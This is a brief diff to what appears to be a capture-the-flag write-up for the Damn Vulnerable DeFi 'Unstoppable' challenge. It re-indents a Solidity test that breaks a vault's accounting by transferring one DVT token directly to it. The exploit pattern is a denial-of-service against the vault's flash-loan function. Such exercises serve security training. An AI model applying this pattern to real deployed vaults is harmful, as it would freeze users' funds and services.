@@ -33,7 +33,7 @@ The attacker transfers DVT directly to the vault contract. This will break the a
 
 ```solidity
 function test_unstoppable() public checkSolvedByPlayer {
-token.transfer(address(vault), 1);
+    token.transfer(address(vault), 1);
 }
 ```
 
